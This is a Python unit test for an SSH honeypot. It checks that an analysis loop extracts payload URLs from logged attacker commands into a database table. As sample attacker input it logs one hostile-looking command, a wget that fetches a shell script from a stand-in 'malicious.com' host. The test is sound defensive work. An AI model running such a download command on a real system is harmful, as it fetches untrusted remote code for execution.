import unittest
import threading
import time
import os
import sqlite3
from ssh_honeypot.core.database import HoneyDB
from ssh_honeypot.core.background_tasks import analysis_loop
from unittest.mock import MagicMock


class TestPayloadIntegration(unittest.TestCase):
    def setUp(self):
        # Use in-memory DB for speed, but analysis_loop needs shared DB
        # To test the loop, we need a DB that supports threads or carefully managed
        # We'll use a temp file DB to allow thread sharing
        self.db_path = "/tmp/test_payload_integ.sqlite"
        if os.path.exists(self.db_path):
            os.remove(self.db_path)

        os.environ["FAUXSSH_DB_PATH"] = self.db_path
        self.db = HoneyDB()
        # Initialize schema if needed (usually auto in __init__)

        # Mock LLM
        self.llm = MagicMock()
        self.llm.analyze_batch.return_value = {}

    def tearDown(self):
        if os.path.exists(self.db_path):
            os.remove(self.db_path)

    def test_payload_extraction_in_loop(self):
        """
        Verify that commands logged to DB are picked up by checking DB
        and extracted into malicious_payloads table by analysis_loop.
        """

        # 1. Log a command with a URL
        session_id = "sess_123"
        self.db.start_session(
            session_id, "127.0.0.1", "root", "root", "ssh", "{}", "ssh"
        )

        cmd = "wget http://malicious.com/bad.sh"
        self.db.log_interaction(
            session_id, "/root", cmd, "", "user", 100, request_md5="hash123"
        )

        # 2. Run analysis loop in background (or just once)
        # We can run it once manually if we tweak logic, but it's designed as a loop.
        # We'll run it in a thread and stop it.

        stop_event = threading.Event()

        # We can't easily stop analysis_loop without modifying it or killing thread.
        # But we modified it to accept 'run_once' arg?
        # Let's check background_tasks.py signature.
        # def analysis_loop(db_instance, llm_instance, alert_manager_instance=None, run_once=False):

        # YES! I saw run_once in the code I edited/viewed earlier.

        # Run synchronous single pass
        from ssh_honeypot.core.background_tasks import analysis_loop

        analysis_loop(self.db, self.llm, run_once=True)

        # 3. Verify Payload
        payloads = self.db.get_pending_payloads(limit=10)

        # Should find it
        found = False
        for p in payloads:
            if "malicious.com" in p["url"]:
                found = True
                break

        self.assertTrue(found, "Payload URL was not extracted by analysis_loop")


if __name__ == "__main__":
    unittest.main()
